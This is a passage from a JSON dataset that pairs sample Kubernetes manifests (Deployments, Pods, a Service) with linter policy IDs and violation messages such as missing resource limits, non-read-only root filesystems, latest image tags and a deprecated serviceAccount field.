    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210615-c3915f8ad7\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"hook\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "1718",
    "manifest_path": "data/manifests/the_stack_sample/sample_0339.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210615-c3915f8ad7\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 4 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "1719",
    "manifest_path": "data/manifests/the_stack_sample/sample_0339.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210615-c3915f8ad7\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"hook\" does not have a read-only root file system"
  },
  {
    "id": "1720",
    "manifest_path": "data/manifests/the_stack_sample/sample_0339.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210615-c3915f8ad7\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"hook\" not found"
  },
  {
    "id": "1721",
    "manifest_path": "data/manifests/the_stack_sample/sample_0339.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210615-c3915f8ad7\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "readiness-port",
    "violation_text": "container \"hook\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "1722",
    "manifest_path": "data/manifests/the_stack_sample/sample_0339.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210615-c3915f8ad7\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"hook\" is not set to runAsNonRoot"
  },
  {
    "id": "1723",
    "manifest_path": "data/manifests/the_stack_sample/sample_0339.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210615-c3915f8ad7\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"hook\" has cpu request 0"
  },
  {
    "id": "1724",
    "manifest_path": "data/manifests/the_stack_sample/sample_0339.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210615-c3915f8ad7\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"hook\" has memory limit 0"
  },
  {
    "id": "1725",
    "manifest_path": "data/manifests/the_stack_sample/sample_0343.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: component-nodejs-dependence-npm\nspec:\n  containers:\n  - name: npm\n    image: hub.opshub.sh/containerops/dependence-nodejs-npm:latest\n    env:\n    - name: CO_DATA\n      value: git_url=https://github.com/WildDogTeam/demo-js-wildchat.git\n    resources:\n      requests:\n        cpu: 2\n        memory: 4G\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"npm\" is using an invalid container image, \"hub.opshub.sh/containerops/dependence-nodejs-npm:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "1726",
    "manifest_path": "data/manifests/the_stack_sample/sample_0343.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: component-nodejs-dependence-npm\nspec:\n  containers:\n  - name: npm\n    image: hub.opshub.sh/containerops/dependence-nodejs-npm:latest\n    env:\n    - name: CO_DATA\n      value: git_url=https://github.com/WildDogTeam/demo-js-wildchat.git\n    resources:\n      requests:\n        cpu: 2\n        memory: 4G\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"npm\" does not have a read-only root file system"
  },
  {
    "id": "1727",
    "manifest_path": "data/manifests/the_stack_sample/sample_0343.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: component-nodejs-dependence-npm\nspec:\n  containers:\n  - name: npm\n    image: hub.opshub.sh/containerops/dependence-nodejs-npm:latest\n    env:\n    - name: CO_DATA\n      value: git_url=https://github.com/WildDogTeam/demo-js-wildchat.git\n    resources:\n      requests:\n        cpu: 2\n        memory: 4G\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"npm\" is not set to runAsNonRoot"
  },
  {
    "id": "1728",
    "manifest_path": "data/manifests/the_stack_sample/sample_0343.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: component-nodejs-dependence-npm\nspec:\n  containers:\n  - name: npm\n    image: hub.opshub.sh/containerops/dependence-nodejs-npm:latest\n    env:\n    - name: CO_DATA\n      value: git_url=https://github.com/WildDogTeam/demo-js-wildchat.git\n    resources:\n      requests:\n        cpu: 2\n        memory: 4G\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"npm\" has memory limit 0"
  },
  {
    "id": "1729",
    "manifest_path": "data/manifests/the_stack_sample/sample_0344.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: alexandermillrpipelinesjavascriptdocker\nspec:\n  type: LoadBalancer\n  ports:\n  - port: 8080\n  selector:\n    app: alexandermillrpipelinesjavascriptdocker\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:alexandermillrpipelinesjavascriptdocker])"
  },
  {
    "id": "1730",
    "manifest_path": "data/manifests/the_stack_sample/sample_0345.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes10\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n  volumes:\n  - flocker:\n      datasetName: test\n    name: volume1\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"container1\" is using an invalid container image, \"k8s.gcr.io/pause\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "1731",
    "manifest_path": "data/manifests/the_stack_sample/sample_0345.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes10\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n  volumes:\n  - flocker:\n      datasetName: test\n    name: volume1\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"initcontainer1\" is using an invalid container image, \"k8s.gcr.io/pause\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "1732",
    "manifest_path": "data/manifests/the_stack_sample/sample_0345.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes10\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n  volumes:\n  - flocker:\n      datasetName: test\n    name: volume1\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"container1\" does not have a read-only root file system"
  },
  {
    "id": "1733",
    "manifest_path": "data/manifests/the_stack_sample/sample_0345.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes10\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n  volumes:\n  - flocker:\n      datasetName: test\n    name: volume1\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"initcontainer1\" does not have a read-only root file system"
  },
  {
    "id": "1734",
    "manifest_path": "data/manifests/the_stack_sample/sample_0345.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes10\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n  volumes:\n  - flocker:\n      datasetName: test\n    name: volume1\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"container1\" has cpu request 0"
  },
  {
    "id": "1735",
    "manifest_path": "data/manifests/the_stack_sample/sample_0345.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes10\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n  volumes:\n  - flocker:\n      datasetName: test\n    name: volume1\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"initcontainer1\" has cpu request 0"
  },
  {
    "id": "1736",
    "manifest_path": "data/manifests/the_stack_sample/sample_0345.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes10\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n  volumes:\n  - flocker:\n      datasetName: test\n    name: volume1\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"container1\" has memory limit 0"
  },
  {
    "id": "1737",
    "manifest_path": "data/manifests/the_stack_sample/sample_0345.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: restrictedvolumes10\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n  volumes:\n  - flocker:\n      datasetName: test\n    name: volume1\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"initcontainer1\" has memory limit 0"
  },
  {
    "id": "1738",
    "manifest_path": "data/manifests/the_stack_sample/sample_0350.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kurl-proxy-kotsadm\n  labels:\n    app: kurl-proxy-kotsadm\n    kots.io/kotsadm: \\\"true\\\"\n    kots.io/backup: velero\nspec:\n  selector:\n    matchLabels:\n      app: kurl-proxy-kotsadm\n  template:\n    metadata:\n      labels:\n        app: kurl-proxy-kotsadm\n        kots.io/kotsadm: \\\"true\\\"\n        kots.io/backup: velero\n    spec:\n      containers:\n      - name: proxy\n        image: kotsadm/kurl-proxy:v1.38.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: NODE_PORT\n          value: \\\"8800\\\"\n        - name: UPSTREAM_ORIGIN\n          value: http://kotsadm:3000\n        - name: DEX_UPSTREAM_ORIGIN\n          value: http://kotsadm-dex:5556\n        - name: TLS_SECRET_NAME\n          value: kotsadm-tls\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: kotsadm-config\n          mountPath: /etc/kotsadm\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 50m\n            memory: 50Mi\n      serviceAccount: kurl-proxy\n      volumes:\n      - name: kotsadm-config\n        configMap:\n          name: kotsadm-application-metadata\n          optional: true\n",
    "policy_id": "deprecated-service-account-field",
    "violation_text": "serviceAccount is specified (kurl-proxy), but this field is deprecated; use serviceAccountName instead"
  },
  {
    "id": "1739",
    "manifest_path": "data/manifests/the_stack_sample/sample_0350.yaml",
